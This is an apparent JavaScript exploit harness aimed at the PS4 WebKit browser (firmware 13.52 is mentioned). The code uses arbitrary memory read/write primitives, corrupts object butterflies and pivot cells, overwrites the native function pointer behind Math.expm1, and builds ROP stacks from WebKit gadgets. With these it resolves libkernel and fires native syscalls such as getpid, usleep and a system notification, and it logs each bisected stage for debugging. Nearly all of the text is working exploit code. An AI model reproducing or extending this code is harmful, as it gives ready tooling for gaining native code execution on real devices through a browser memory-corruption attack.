    const lk = parseAddr(BILLZAI_LK_BASE);
    if (!lk) {
        mark("LK-BILLZAI-ERR", "bad base constant");
        renderOut();
        return;
    }
    if (addrIn) addrIn.value = "0x" + BILLZAI_LK_BASE;
    mark("LK-BILLZAI", "base=0x" + BILLZAI_LK_BASE + " accept 0-read build=" + BUILD_ID);
    renderOut();
    crashLog.flushSync();

    try {
        const v = verifyLibkernelZeroRead(lk, off, { via: "billzai" });
        if (v.ok) {
            saveLibkernelSession(lk, null, { forced: true });
            mark("LK-BILLZAI-OK", String(lk) + " (0 reads — 16KB-aligned lk, S.init/BillZai style)");
            state("BillZai lk accepted — reload → usleep Start", "ok");
        } else {
            mark("LK-BILLZAI-MISS", v.error || "tag miss");
            state("BillZai base rejected", "bad");
        }
        crashLog.append("LK-BILLZAI " + (v.ok ? "OK" : "MISS") + " 0x" + BILLZAI_LK_BASE, "LK-BILLZAI");
        crashLog.flushSync();
    } catch (err) {
        mark("LK-BILLZAI-ERR", err.message || String(err));
        state("BillZai try error", "bad");
        crashLog.flushSync();
    }
    renderOut();
}

/** Force lk — 0 reads, session only. Works before Start (manual paste). */
function runForceLkOnly(lk) {
    if (busy) return;
    if (lk) acceptLkFromHex(String(lk).replace(/^0x/i, ""));
    else acceptLkFromHex(null);
}

function runArmGetpid() {
    runFireGetpid();
}

function bisectPrepSync(p, off, tag) {
    if (!nativePrep) return;
    const wb = nativePrep.webkitBase;
    if (!wb) {
        bisectLog("PREP-SYNC-SKIP", (tag || "?") + " no prep.webkitBase");
        return;
    }
    try {
        refreshPrepSlabGadgets(nativePrep, off, wb);
    } catch (err) {
        bisectLog("PREP-SYNC-FAIL", (tag || "?") + " " + (err.message || String(err)));
        throw err;
    }
    bisectLog("PREP-SYNC", (tag || "?")
        + " wb=" + wb
        + " G0=" + nativePrep.G.G0 + " +0x" + (off.wk_MOV_RDI_RSI_30_CALL || 0).toString(16)
        + " G1=+0x" + (off.wk_POP_RAX_MOV_RAX_JMP_18 || 0).toString(16)
        + " G5=" + nativePrep.G.G5
        + " S=" + nativePrep.M.S
        + " staged=" + !!nativePrep.staged);
}

function bisectFlushBeforeFire() {
    renderOut();
    try { crashLog.flushSync(); } catch (_) { }
}

function bisectHookVerifyLogFrom(hv, hookOffs, tag) {
    const detail = hv.rows.map(function (r) {
        return "+0x" + r.off.toString(16) + "=" + (r.ok ? "S" : (r.peek == null ? "null" : r.peek));
    }).join(" ");
    bisectLog("HOOK-VERIFY", (tag || "?") + " " + detail
        + " ok=" + hv.okCount + "/" + hookOffs.length + " want S=" + hv.want);
    if (!hv.ok)
        bisectLog("HOOK-FAIL", "write8 did not stick on any slot — run N4p peek, try ?pivot=ta");
    return hv;
}

function bisectHookVerifyLog(p, prep, hookOffs, tag) {
    return bisectHookVerifyLogFrom(verifyPivotHookWrites(p, prep, hookOffs), hookOffs, tag);
}

function bisectHookPendingCount(prep) {
    if (!prep || !prep._bisect) return 0;
    const bis = prep._bisect;
    if (bis.multiSaved && bis.multiSaved.length) return bis.multiSaved.length;
    if (bis.pivotSaved != null) return 1;
    return 0;
}

function bisectPrepIsHot(prep) {
    if (!prep) return false;
    if (prep.mainArmed) return true;
    return bisectHookPendingCount(prep) > 0;
}

function bisectLogHookPost(p, prep, hookOffs) {
    if (!prep || !prep.pivotCell || !prep.M) return;
    bisectHookVerifyLog(p, prep, hookOffs || G0_HOOK_OFFS, "post-fire");
}

function bisectLogPreflight(p, prep, pf, tag) {
    bisectLog("PRE-FLIGHT", (tag || "?")
        + " S=" + (pf.slab && pf.slab.S.ok)
        + " K=" + (pf.slab && pf.slab.K.ok)
        + " P=" + (pf.slab && pf.slab.P.ok)
        + " rsp=" + (pf.slab && pf.slab.rsp ? pf.slab.rsp.ok : "?")
        + " mainMf=" + prep.mainMf
        + " path=" + (prep._cap && prep._cap.path || "?"));
    const hit = readPivotButterfly(p, prep.pivotCell);
    bisectLog("PRE-PIVOT", "cell=" + prep.pivotCell + " butterfly="
        + (hit ? hit.bf : "null")
        + (hit ? (" @cell+0x" + hit.cellOff.toString(16)) : "")
        + " S=" + prep.M.S + " G0=" + prep.G.G0 + " hook=" + pivotHookMode());
    if (pf.slabContent && !pf.slabContent.ok)
        bisectLog("PRE-SLAB-BAD", pf.slabContent.reasons.join("; "));
    try {
        const d = describeSlabLayout(p, prep);
        bisectLog("PRE-STACK", "rsp=" + d.rsp + " insts=" + d.insts
            + (d.stackTop.length
                ? " [" + d.stackTop.slice(0, 3).map(function (q, i) {
                    return i + "=" + q;
                }).join(" ") + "]" : ""));
    } catch (_) { }
}

/** chain_poops callAddr — layout + fireNativeCall (hook+0, restore after). */
function bisectRunPoopsAtomic(p, off, tag) {
    bisectPrepSync(p, off, "pre-" + tag);
    layoutSmokeStack(nativePrep);
    const pf = bisectPreflight(p, nativePrep);
    bisectLogPreflight(p, nativePrep, pf, tag);
    if (!pf.ok)
        throw new Error("preflight: " + pf.reasons.join("; "));
    bisectFlushBeforeFire();
    bisectLog("BISECT-WARN", tag + " fireNativeCall hook=" + pivotHookMode() + "…");
    return fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
}

/** Manual hook then expm1 (no auto-restore) — for multi/bf hunts. */
function bisectRunHookFire(p, off, hookFn, hookOffs, tag) {
    bisectPrepSync(p, off, "pre-" + tag);
    layoutSmokeStack(nativePrep);
    bisectArmG0(p, nativePrep);
    const pf = bisectPreflight(p, nativePrep);
    bisectLogPreflight(p, nativePrep, pf, tag);
    if (!pf.ok)
        throw new Error("preflight: " + pf.reasons.join("; "));
    hookFn(p, nativePrep, hookOffs, window._wkCarrier || null);
    const hv = nativePrep._bisect && nativePrep._bisect.multiSaved
        ? verifyPivotHookSaved(p, nativePrep)
        : verifyPivotHookWrites(p, nativePrep, hookOffs || G0_HOOK_POOPS);
    const detail = hv.rows.map(function (r) {
        const base = r.base ? r.base + "+" : "cell+";
        return base + "0x" + r.off.toString(16) + "=" + (r.ok ? "S" : (r.peek == null ? "null" : r.peek));
    }).join(" ");
    bisectLog("HOOK-VERIFY", tag + " " + detail + " ok=" + hv.okCount + "/" + hv.rows.length);
    bisectSnapshot(p, nativePrep, off, "post-hook-" + tag);
    bisectFlushBeforeFire();
    if (!hv.ok)
        throw new Error("hook verify failed");
    bisectLog("BISECT-WARN", tag + " expm1 fire…");
    bisectFireExpm1(p, nativePrep);
    return nativePrep.M.frameDv.getUint32(0, true) | 0;
}

function bisectRunPoopsFire(p, off, hookOffs, tag) {
    return bisectRunHookFire(p, off, bisectHookPivotMulti, hookOffs, tag);
}

function requireNativePrep() {
    if (!nativePrep) throw new Error("run N1 prep first");
}

function pivotObjForPrep(carrier, prep) {
    const mode = params.get("pivot") || "empty";
    if (mode === "ta" && carrier && carrier.textarea)
        return carrier.textarea;
    if (mode === "props")
        return { __p0: 1, __p1: 2, __p2: 3, __p3: 4, __p4: 5 };
    if (prep && prep.M && prep.M.bufs) {
        if (mode === "store" && prep.M.bufs[0]) return prep.M.bufs[0];
        if (mode === "pb" && prep.M.bufs[1]) return prep.M.bufs[1];
    }
    return {};
}

function finishPivotObj(p, prep, carrier) {
    const obj = pivotObjForPrep(carrier, prep);
    prep.pivotObj = obj;
    prep.pivotCell = p.leakval(obj);
    prep._carrier = carrier || null;
    prep._pivotBfUpgraded = null;
    if (prep.keepAlive.indexOf(obj) < 0)
        prep.keepAlive.push(obj);
    return obj;
}

function nativeFireOpts(hookMode, stub) {
    const o = { hook: hookMode, carrier: window._wkCarrier || null };
    if (stub && stub.verified && stub.addr) {
        o.stubAddr = stub.addr;
        o.stubOff = stub.off;
    }
    return o;
}

function bisectPreFireLog(p, prep, lk, stub, tag, hookMode) {
    let stubOk = "?";
    if (stub && stub.verified && stub.addr)
        stubOk = "stub-ok@" + stub.tag + "=" + stub.addr;
    const hit = readPivotButterfly(p, prep.pivotCell);
    let bfStr = hit ? String(hit.bf) : "null";
    if (prep._pivotBfSource) bfStr += " src=" + prep._pivotBfSource;
    if (prep._pivotBfUpgraded) bfStr += " pivot=" + prep._pivotBfUpgraded;
    if (prep._pivotBfInjected) bfStr += " injected=1";
    let hookSites = hookMode;
    if (prep._bisect && prep._bisect.multiSaved && prep._bisect.multiSaved.length) {
        hookSites = prep._bisect.multiSaved.map(function (e) {
            return (e.base || "cell") + "+0x" + e.off.toString(16);
        }).join(",");
    }
    bisectLog("PRE-FIRE", tag + " lk=" + lk + " " + stubOk + " hook=" + hookSites
        + " pivot=" + (params.get("pivot") || "empty")
        + " cell=" + prep.pivotCell + " bf=" + bfStr + " S=" + prep.M.S
        + " path=" + (prep._cap && prep._cap.path || "?"));
}

function bisectFireGetpidHook(p, off, hookMode, tag) {
    const lk = lkFromUi();
    if (!lk) throw new Error("Accept fn first (k_usleep ptr)");
    const stub = resolveGetpidStubOff(p, lk, off);
    if (!stub.verified || !stub.addr)
        throw new Error("getpid stub — Accept fn (k_usleep) first");
    if (pivotHookNeedsButterfly(hookMode))
        ensurePivotButterfly(p, nativePrep, window._wkCarrier || null);
    const fireOpts = nativeFireOpts(hookMode, stub);
    applyPivotHookForFire(p, nativePrep, off, fireOpts);
    bisectPreFireLog(p, nativePrep, lk, stub, tag, hookMode);
    bisectFlushBeforeFire();
    return firePivotGetpid(p, nativePrep, lk, off, stub.off, fireOpts);
}

function codeLooksNative(code4) {
    return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
}

/** cal-style — prefer fixed jfn+m_function (chain_poops); scan only if fixed slot bad. */
function captureMainMfForPrep(p, off) {
    const mOff = off.wk_JSFunction_m_function || 0x28;
    const cell = p.leakval(Math.expm1);
    const jfn = read8p(p, cell.add32(0x18));
    if (!jfn) throw new Error("no JSFunction @ expm1 cell+0x18");
    const fnFixed = read8p(p, jfn.add32(mOff));
    if (fnFixed && codeLooksNative(read4p(p, fnFixed))) {
        return {
            cell, jfn,
            mainMf: jfn.add32(mOff),
            mainOrig: fnFixed,
            nativeFn: fnFixed,
            path: "jfn+0x" + mOff.toString(16) + " (fixed)",
        };
    }
    const cands = [];
    for (const o of [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10]) {
        const fn = read8p(p, jfn.add32(o));
        if (fn && fn.hi > 0) cands.push({ o, fn });
    }
    let pick = null;
    for (let i = 0; i < cands.length; i++) {
        if (codeLooksNative(read4p(p, cands[i].fn))) {
            pick = cands[i];
            break;
        }
    }
    if (!pick && cands.length) pick = cands[0];
    if (!pick) throw new Error("mainMf capture failed");
    const mainMf = jfn.add32(pick.o);
    const mainOrig = read8p(p, mainMf);
    if (!mainOrig) throw new Error("mainOrig read failed");
    return {
        cell, jfn, mainMf, mainOrig, nativeFn: mainOrig,
        path: "jfn+0x" + pick.o.toString(16) + " (scan)",
    };
}

/** Visible log + sessionStorage flush (survives N5 OOM on reload). */
function bisectLog(tag, detail) {
    mark(tag, detail);
    try {
        crashLog.append(tag + (detail == null || detail === "" ? "" : "  " + detail), tag);
        crashLog.flushSync();
    } catch (_) { }
    renderOut();
}

function bisectSnapshot(p, prep, off, label) {
    if (!prep || !p) return;
    const mainNow = prep.mainMf ? p.read8(prep.mainMf) : null;
    const bis = prep._bisect || {};
    let hookSiteStr = "—";
    if (bis.multiSaved && bis.multiSaved.length) {
        hookSiteStr = bis.multiSaved.map(function (e) {
            return "cell+0x" + e.off.toString(16);
        }).join(",");
    } else if (bis.pivotSite) {
        hookSiteStr = String(bis.pivotSite);
    }
    let hookPeek = "—";
    if (bis.multiSaved && bis.multiSaved.length && prep.M && prep.M.S) {
        let n = 0;
        for (let i = 0; i < bis.multiSaved.length; i++) {
            let v = null;
            try { v = p.read8(bis.multiSaved[i].site); } catch (_) { v = null; }
            if (v != null && String(v) === String(prep.M.S)) n++;
        }
        hookPeek = n + "/" + bis.multiSaved.length + "=S";
    } else if (bis.pivotSite) {
        let v = null;
        try { v = p.read8(bis.pivotSite); } catch (_) { v = null; }
        hookPeek = v == null ? "null" : String(v);
    }
    let slab = null;
    try { slab = verifySlabAddrs(p, prep); } catch (_) { }
    bisectLog("BISECT-SNAP", (label || "?")
        + " wb=" + prep.webkitBase
        + " mainMf=" + prep.mainMf + " now=" + mainNow + " G0=" + prep.G.G0
        + " orig=" + prep.mainOrig
        + " pivotCell=" + prep.pivotCell
        + " hookSite=" + hookSiteStr + " hookPeek=" + hookPeek
        + " S=" + (prep.M && prep.M.S)
        + (slab ? " slab S=" + slab.S.ok + " K=" + slab.K.ok
            + (slab.rsp ? " rsp=" + slab.rsp.ok : "") : ""));
}

/** One bisect step — survives = BISECT-OK in log; OOM = tab dies on that step. */
function runNativeBisectStep(stepId) {
    if (!ready || !window.p || busy || !nativeAllowed) return;
    const p = window.p;
    const off = loadEffectiveOff();
    busy = true;

    /* renderOut/bisectLog before disarm OOMs if G0 armed + pivot poisoned */
    let untangle = null;
    let hookPending = 0;
    if (nativePrep && (stepId === "disarm" || stepId === "restore"
            || (bisectPrepIsHot(nativePrep) && stepId === "peek-pivot"))) {
        hookPending = bisectHookPendingCount(nativePrep);
        try { untangle = bisectEmergencyUntangle(p, nativePrep); } catch (_) { }
    }

    setUi();
    bisectLog("BISECT", "step " + stepId + " build=" + BUILD_ID
        + (untangle ? " pre-untangle disarmed=" + untangle.disarmed
            + " pivotRestored=" + untangle.restored
            + " hookPending=" + hookPending : ""));
    let pid = -1;
    try {
        switch (stepId) {
        case "prep":
            if (nativePrep && params.get("freshprep") !== "1") {
                if (prepGadgetRvaStale(nativePrep, off)) {
                    bisectLog("BISECT-WARN", "prep @ Start is STALE — add ?freshprep=1 to URL and redo Start+N1");
                }
                mark("BISECT-OK", "N1 reuse @ Start wb=" + nativePrep.webkitBase
                    + " S=" + nativePrep.M.S + " (skip N1 — prep pinned @ PRIMITIVE-OK)");
                state("N1 skipped — use N2", "ok");
                break;
            }
            nativePrep = null;
            ensureNativePrep(p, off);
            pinNativeRetain();
            mark("BISECT-OK", "N1 fresh prep wb=" + nativePrep.webkitBase
                + " S=" + nativePrep.M.S + " K=" + nativePrep.M.K
                + " G0=" + nativePrep.G.G0 + " G5=" + nativePrep.G.G5
                + " mainMf=" + nativePrep.mainMf + " pivotCell=" + nativePrep.pivotCell);
            state("N1 prep OK", "ok");
            break;
        case "smoke-now":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify pivot first (PIVOT-FULL-READY)");
            pid = bisectFireGetpidHook(p, off, pivotHookMode(), "N0");
            bisectLog("BISECT-OK", "N0 survived pid=" + pid);
            state("N0 OK pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "smoke-g30":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify first");
            pid = bisectFireGetpidHook(p, off, "cell30", "N0g+30");
            bisectLog("BISECT-OK", "N0g+30 survived pid=" + pid);
            state("N0g+30 pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "smoke-gmulti":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify first");
            pid = bisectFireGetpidHook(p, off, "multi-safe", "N0m");
            bisectLog("BISECT-OK", "N0m safe-multi survived pid=" + pid);
            state("N0m pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "smoke-gall":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify first");
            pid = bisectFireGetpidHook(p, off, "multiall", "N0all");
            bisectLog("BISECT-OK", "N0all cell+bf survived pid=" + pid);
            state("N0all pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "smoke-gbf":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify first");
            pid = bisectFireGetpidHook(p, off, "bf", "N0g-bf0");
            bisectLog("BISECT-OK", "N0g bf0 survived pid=" + pid);
            state("N0g bf0 pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "smoke-gbf30":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify first");
            pid = bisectFireGetpidHook(p, off, "bf30", "N0g-bf30");
            bisectLog("BISECT-OK", "N0g bf30 survived pid=" + pid);
            state("N0g bf30 pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "layout-smoke":
            requireNativePrep();
            layoutSmokeStack(nativePrep);
            try {
                const slab = verifySlabAddrs(p, nativePrep);
                bisectLog("BISECT-SLAB", "S=" + slab.S.ok + " P=" + slab.P.ok
                    + " K=" + slab.K.ok + " F=" + slab.F.ok
                    + (slab.rsp ? " rsp=" + slab.rsp.ok : "")
                    + " Kaddr=" + nativePrep.M.K + " Saddr=" + nativePrep.M.S);
                if (!slab.K.ok || !slab.S.ok)
                    bisectLog("BISECT-WARN", "slab unreadable — bufAddr wrong → pivot OOM");
            } catch (slabErr) {
                bisectLog("BISECT-WARN", "slab check: " + (slabErr.message || slabErr));
            }
            bisectLog("BISECT-OK", "N2 layout smoke");
            state("N2 layout OK", "ok");
            break;
        case "slab-chain":
            requireNativePrep();
            layoutSmokeStack(nativePrep);
            try {
                const slab = verifySlabAddrs(p, nativePrep);
                const content = verifySlabContent(p, nativePrep);
                const stack = verifyStackContent(p, nativePrep);
                bisectLog("BISECT-SLAB", "S=" + slab.S.ok + " K=" + slab.K.ok
                    + " rsp=" + (slab.rsp ? slab.rsp.ok : "?")
                    + " content=" + content.ok + " stack=" + stack.ok);
                if (!content.ok)
                    bisectLog("SLAB-CHAIN-BAD", content.reasons.join("; "));
                if (!stack.ok)
                    bisectLog("STACK-CHAIN-BAD", stack.reasons.join("; "));
                if (content.ok && stack.ok)
                    bisectLog("BISECT-OK", "N2c slab+stack OK bufAddr="
                        + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
            } catch (slabErr) {
                bisectLog("BISECT-FAIL", "N2c " + (slabErr.message || slabErr));
            }
            state("N2c slab OK", "ok");
            break;
        case "arm-g0":
            requireNativePrep();
            bisectPrepSync(p, off, "pre-N3");
            bisectArmG0(p, nativePrep);
            bisectSnapshot(p, nativePrep, off, "post-N3");
            bisectLog("BISECT-OK", "N3 armed G0 → mainMf");
            state("N3 arm G0 OK", "ok");
            break;
        case "peek-pivot":
            requireNativePrep();
            try {
                const rows = probePivotCell(p, nativePrep.pivotCell);
                for (let i = 0; i < rows.length; i++) {
                    const r = rows[i];
                    bisectLog("PIVOT-PEEK", "+0x" + r.off.toString(16) + "=" + r.val);
                }
                bisectLog("BISECT-OK", "N4p peek pivotCell=" + nativePrep.pivotCell
                    + " (G0 reads [rsi+0x30] — hook must poison THAT slot)");
            } catch (peekErr) {
                bisectLog("BISECT-FAIL", "N4p " + (peekErr.message || peekErr));
            }
            state("N4p peek OK", "ok");
            break;
        case "hook":
            requireNativePrep();
            bisectHookPivot(p, nativePrep, off);
            try {
                const d = describeSlabLayout(p, nativePrep);
                const site = nativePrep._bisect && nativePrep._bisect.pivotSite;
                const armed = p.read8(nativePrep.mainMf);
                bisectLog("BISECT-OK", "N4 hook site=" + site + " → S=" + nativePrep.M.S
                    + " hook+0x" + (off.pivot_hook_off != null
                        ? off.pivot_hook_off.toString(16) : "0")
                    + " mainMf=" + armed + " wantG0=" + nativePrep.G.G0
                    + " rsp=" + d.rsp);
                if (d.stackTop.length)
                    bisectLog("BISECT-STACK", d.stackTop.map((q, i) => "[" + i + "]=" + q).join(" "));
            } catch (logErr) {
                bisectLog("BISECT-OK", "N4 hook log err: " + (logErr.message || logErr));
            }
            state("N4 hook OK", "ok");
            break;
        case "hook-poops":
            requireNativePrep();
            bisectHookPivotAt(p, nativePrep, 0);
            bisectSnapshot(p, nativePrep, off, "post-N4b");
            bisectLog("BISECT-OK", "N4b hook @ leakval+0 → S=" + nativePrep.M.S);
            state("N4b hook0 OK", "ok");
            break;
        case "hook-multi":
            requireNativePrep();
            bisectHookPivotMulti(p, nativePrep, G0_HOOK_OFFS);
            bisectHookVerifyLog(p, nativePrep, G0_HOOK_OFFS, "N4m");
            bisectSnapshot(p, nativePrep, off, "post-N4m");
            bisectLog("BISECT-OK", "N4m multi-hook → S=" + nativePrep.M.S);
            state("N4m multi OK", "ok");
            break;
        case "hook-verify":
            requireNativePrep();
            bisectPrepSync(p, off, "pre-N4v");
            bisectHookPivotMulti(p, nativePrep, G0_HOOK_OFFS);
            const hv4v = verifyPivotHookWrites(p, nativePrep, G0_HOOK_OFFS);
            bisectRestorePivotOnly(p, nativePrep);
            bisectHookVerifyLogFrom(hv4v, G0_HOOK_OFFS, "N4v");
            bisectSnapshot(p, nativePrep, off, "post-N4v");
            bisectLog("BISECT-OK", "N4v hook verified + pivot restored — tab clean");
            state("N4v hook OK", "ok");
            break;
        case "expm1-lite":
            requireNativePrep();
            bisectPrepSync(p, off, "pre-N5a");
            if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
            bisectSnapshot(p, nativePrep, off, "pre-N5a");
            bisectFlushBeforeFire();
            bisectLog("BISECT-WARN", "N5a expm1(1) — OOM EXPECTED (G0 runs, NO hook)");
            Math.expm1(1);
            bisectLog("BISECT-OK", "N5a expm1(1) survived (unexpected — G0 may not have run)");
            state("N5a OK", "ok");
            break;
        case "expm1-nohook":
            requireNativePrep();
            bisectPrepSync(p, off, "pre-N5c");
            layoutSmokeStack(nativePrep);
            if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
            bisectSnapshot(p, nativePrep, off, "pre-N5c");
            bisectFlushBeforeFire();
            bisectLog("BISECT-WARN", "N5c Math.expm1(pivotObj) — G0 armed, NO hook (OOM expected)");
            Math.expm1(nativePrep.pivotObj);
            bisectLog("BISECT-OK", "N5c expm1(obj) survived");
            state("N5c OK", "ok");
            break;
        case "expm1":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("Verify pivot first");
            pid = bisectRunPoopsAtomic(p, off, "N5");
            bisectLog("BISECT-OK", "N5 atomic survived frame=" + pid);
            state("N5 expm1 OK", "ok");
            break;
        case "expm1-multi":
            requireNativePrep();
            pid = bisectRunPoopsFire(p, off, G0_HOOK_OFFS, "N5m");
            bisectLog("BISECT-OK", "N5m multi survived frame=" + pid);
            state("N5m OK", "ok");
            break;
        case "expm1-bf":
            requireNativePrep();
            pid = bisectRunHookFire(p, off, bisectHookPivotButterfly, G0_HOOK_OFFS, "N5bf");
            bisectLog("BISECT-OK", "N5bf butterfly survived frame=" + pid);
            state("N5bf OK", "ok");
            break;
        case "expm1-h30":
            requireNativePrep();
            pid = bisectRunHookFire(p, off, function (pp, pr) {
                bisectHookPivotAt(pp, pr, 0x30);
            }, [0x30], "N5h");
            bisectLog("BISECT-OK", "N5h +0x30 survived frame=" + pid);
            state("N5h OK", "ok");
            break;
        case "expm1-g5alt": {
            requireNativePrep();
            const g5rva = g5Expm1Hint(off);
            if (!g5rva) throw new Error("no G5 expm1 hint");
            const g5 = nativePrep.webkitBase.add32(g5rva);
            patchPrepG5(nativePrep, g5);
            bisectSnapshot(p, nativePrep, off, "pre-N5b");
            bisectLog("BISECT-WARN", "N5b G5alt expm1+0x" + g5rva.toString(16));
            bisectFireExpm1(p, nativePrep);
            pid = nativePrep.M.frameDv.getUint32(0, true) | 0;
            bisectLog("BISECT-OK", "N5b G5alt survived frame=" + pid);
            state("N5b G5alt OK", "ok");
            break;
        }
        case "disarm":
            requireNativePrep();
            if (!untangle)
                untangle = bisectEmergencyUntangle(p, nativePrep);
            bisectLog("BISECT-OK", "N6d emergency untangle disarmed=" + untangle.disarmed
                + " pivotRestored=" + untangle.restored
                + " orig=" + nativePrep.mainOrig);
            state("N6d disarm OK", "ok");
            break;
        case "restore":
            requireNativePrep();
            if (!untangle)
                untangle = bisectEmergencyUntangle(p, nativePrep);
            bisectLog("BISECT-OK", "N6 restored disarmed=" + untangle.disarmed
                + " pivotRestored=" + untangle.restored);
            state("N6 restore OK", "ok");
            break;
        case "smoke-full":
            requireNativePrep();
            if (!gateNativeFire(p, off)) throw new Error("pivot verify failed — Verify pivot first");
            layoutSmokeStack(nativePrep);
            pid = fireNativeCallBisect(p, nativePrep, off);
            mark("BISECT-OK", "N7 smoke full frame=" + pid);
            state("N7 smoke full OK", "ok");
            break;
        case "layout-getpid": {
            requireNativePrep();
            const lk = lkFromUi();
            if (!lk) throw new Error("paste lk in hex box");
            const stub = resolveGetpidStubOff(p, lk, off);
            if (!stub.verified)
                throw new Error("getpid stub not found");
            layoutGetpidStack(nativePrep, lk, stub.off, stub.addr);
            mark("BISECT-OK", "N8 getpid stack " + stub.tag
                + " addr=" + stub.addr + " — no fire yet");
            state("N8 stage lk OK", "ok");
            break;
        }
        case "fire":
            requireNativePrep();
            mark("BISECT-WARN", "N9 fireNativeCall (needs N2/N8 layout + arm/hook inside)");
            renderOut();
            pid = fireNativeCallBisect(p, nativePrep, off);
            mark("BISECT-OK", "N9 fire OK frame=" + pid);
            state("N9 fire OK pid=" + pid, pid > 0 ? "ok" : "warn");
            break;
        case "getpid-full": {
            requireNativePrep();
            const lk2 = lkFromUi();
            if (!lk2) throw new Error("paste lk in hex box");
            const stub2 = resolveGetpidStubOff(p, lk2, off);
            if (!stub2.verified)
                throw new Error("getpid stub not found");
            layoutGetpidStack(nativePrep, lk2, stub2.off, stub2.addr);
            mark("BISECT-WARN", "N10 getpid full fire " + stub2.tag);
            renderOut();
            pid = fireNativeCallBisect(p, nativePrep, off);
            mark("BISECT-OK", "N10 getpid=" + pid);
            state(pid > 0 ? "getpid OK pid=" + pid : "N10 fired pid=" + pid,
                pid > 0 ? "ok" : "warn");
            break;
        }
        default:
            throw new Error("unknown step " + stepId);
        }
    } catch (err) {
        try { if (nativePrep) bisectEmergencyUntangle(p, nativePrep); } catch (_) { }
        const em = err.message || String(err);
        bisectLog("BISECT-FAIL", stepId + " " + em);
        if (/butterfly|injectFake/i.test(em) && nativePrep && nativePrep.pivotCell) {
            const diag = formatPivotBfDiag(p, nativePrep.pivotCell);
            bisectLog("BF-DIAG", "cell=" + nativePrep.pivotCell + " " + diag.join(" "));
        }
        state("bisect fail @ " + stepId, "bad");
    } finally {
        busy = false;
        setUi();
        renderOut();
        try { crashLog.flushSync(); } catch (_) { }
    }
}

function wireNativeBisectBar() {
    const host = $("native-bisect");
    if (!host) return;
    for (let i = 0; i < NATIVE_BISECT_STEPS.length; i++) {
        const s = NATIVE_BISECT_STEPS[i];
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = s.label;
        b.title = s.title;
        b.dataset.nstep = s.id;
        wireClick(b, function () { runNativeBisectStep(s.id); });
        host.appendChild(b);
        bisectBtns.push(b);
    }
}

function runFireNotify() {
    if (busy || !ready || !window.p || !nativeAllowed) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const lk = lkFromUi();
    if (!lk) {
        mark("NOTIFY-SKIP", "2e → paste k_usleep fn → Accept fn → Fire notify");
        renderOut();
        return;
    }

    busy = true;
    nativeQuiet = true;
    lkQuiet = true;
    const bases = basesFromSession(off);
    mark("NOTIFY-FIRE", "Collator path build=" + BUILD_ID + " lk=" + lk);
    renderOut();

    try {
        for (let i = 0; i < notifyRetain.length; i++)
            retained.push(notifyRetain[i]);
        const out = runCollatorNotify({
            p,
            off,
            lk,
            webkitBase: bases.webkitBase || chainWebkitBase(off),
            nativeFn: bases.nativeFn,
            leakval: p.leakval,
            retain: notifyRetain,
            params,
            log: mark,
        });
        if (out.sent) {
            mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
            state("notification sent — check PS4 toast", "ok");
            try {
                saveLibkernelSession(lk, null, { forced: true });
                crashLog.append("NOTIFY-OK result=0", "NOTIFY-OK");
            } catch (_) { }
        } else if (out.ok) {
            mark("NOTIFY-RET", "syscall returned " + out.result + " (want 0)");
            state("notify errno " + out.result, "warn");
        } else {
            mark("NOTIFY-FAIL", "bad return " + out.result);
            state("notify failed", "bad");
        }
    } catch (err) {
        mark("NOTIFY-FAIL", (err.message || String(err)) + " build=" + BUILD_ID);
        mark("NOTIFY-HINT", "RE gd/gps on 13.52 — ?gd=0x…&gps=0x… or fix lk via 2e");
        state("notify failed", "bad");
    } finally {
        nativeQuiet = false;
        lkQuiet = false;
        busy = false;
        setUi();
        renderOut();
        try { crashLog.flushSync(); } catch (_) { }
    }
}

function runFireGetpid() {
    if (busy || !ready || !window.p || !nativeAllowed) return;
    const nm = getNativeMode();
    if (nm === "notify") {
        runFireNotify();
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    const lk = lkFromUi();
    if (nm !== "smoke" && !lk) {
        mark("NATIVE-SKIP", "paste lk → Accept lk → Fire getpid");
        renderOut();
        return;
    }
    if (!gateNativeFire(p, off)) {
        state("pivot not ready", "warn");
        renderOut();
        setUi();
        return;
    }

    busy = true;
    nativeQuiet = true;
    lkQuiet = true;

    try {
        ensureNativePrepForFire(p, off, nm);
    } catch (prepErr) {
        busy = false;
        nativeQuiet = false;
        lkQuiet = false;
        mark("NATIVE-FAIL", "prep: " + (prepErr.message || String(prepErr)));
        state("native prep failed", "bad");
        renderOut();
        return;
    }

    pinNativeRetain();

    let errMsg = null;
    let pid = -1;
    const kind = nm === "smoke" ? "smoke" : (nm === "usleep" ? "usleep+13b20" : "getpid");
    try {
        if (nm === "smoke") {
            firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
        } else if (nm === "usleep") {
            pid = fireUsleep(p, nativePrep, lk, off, 1000);
        } else {
            const stub = resolveGetpidStubOff(p, lk, off);
            if (!stub.verified)
                throw new Error("getpid stub not found — re-Accept lk with usleep fn ptr");
            mark("NATIVE-STUB", "getpid " + stub.tag + " addr=" + stub.addr);
            stageGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(pivotHookMode(), stub));
            pid = fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
        }
    } catch (err) {
        errMsg = err.message || String(err);
    }

